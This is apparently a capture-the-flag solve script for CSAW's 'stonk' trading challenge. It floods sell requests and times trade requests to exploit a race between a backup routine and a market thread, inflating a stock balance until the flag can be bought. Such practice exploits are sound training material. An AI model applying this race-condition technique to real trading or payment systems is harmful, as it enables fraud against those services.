import requests
import json
import random
import time

# ADDRESS = "http://stonk.csaw.io"
# PORT = 4660
ADDRESS = "http://127.0.0.1"
PORT = 12345

print(\
"""Thank you for choosing City Subway Auction Website (CSAW)'s Trading Platform
As a thank you for using our platform, all new registrants will be granted $2000
and the flags are on sale for $9001 dollars. Have fun trading!

Here are the options:

Login and register with ID

1. List Account Status
2. Buy Stocks
3. Sell Stocks
4. Trade Stocks
5. Buy flags at $9001


""")

def inp() -> str:
    print(">", end="")
    return input()

def sendGET(subpath) -> str:
    try:
        response = requests.get(ADDRESS + ":" + str(PORT) + subpath)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None


def sendPOST(subpath, data) -> str:
    url = ADDRESS + ":" + str(PORT) + subpath
    payload = data

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None

def buyStock(key, str):
    body = sendPOST("/buy", {"key":key, "stock": str})
    return body

def sellStock(key, str):
    body = sendPOST("/sell", {"key":key, "stock": str})
    return body

def tradeStock(key, str, str1):
    body = sendPOST("/trade", {"key":key, "stock": str, "stock1": str1})
    return body

def listCalls() -> str:
    body = sendGET("/listCalls")
    out = json.loads(body)
    return "\n".join((str(i["name"]) + " at " + str(i["price"]) for i in out.values()))

def flag(key) -> str:
    body = sendPOST("/flag", {"key":key})
    return body

def status(key) -> str:
    body = sendPOST("/login", {"key":key})
    return body

print(listCalls())

print()

key = "".join(random.choice("0123456789") for i in range(10))
print("key:", key)
print(status(key))

buyStock(key, "BROOKING")
while True:
	start = time.time()
	for i in range(11): # make more than 10 requests to trigger backup functionality in process.py:187
		sellStock(key, "ELONX")
    # make a trade request for a more expensive company. This will cause the market_scrape thread
    # to add 1 to our BROOKING stock. Meanwhile, the backup functionality (triggered if user.requests > 10)
    # has already restored our BROOKING stocks to its value before being decreased by postTrade. This race
    # condition will cause BROOKING stock to increase by 1.
	tradeStock(key, "BROOKING", "BURPSHARKHAT")
	stat = status(key)
	print(stat)
	duration = time.time() - start
	print("duration:", duration)
    # Keep in sync with the server. We wait until user.requests is cleared in the next 10-second cycle.
	time.sleep(10 - duration)
	if (json.loads(stat)["BROOKING"] >= 6):
		break

for i in range(6):
	sellStock(key, "BROOKING")
print(flag(key))
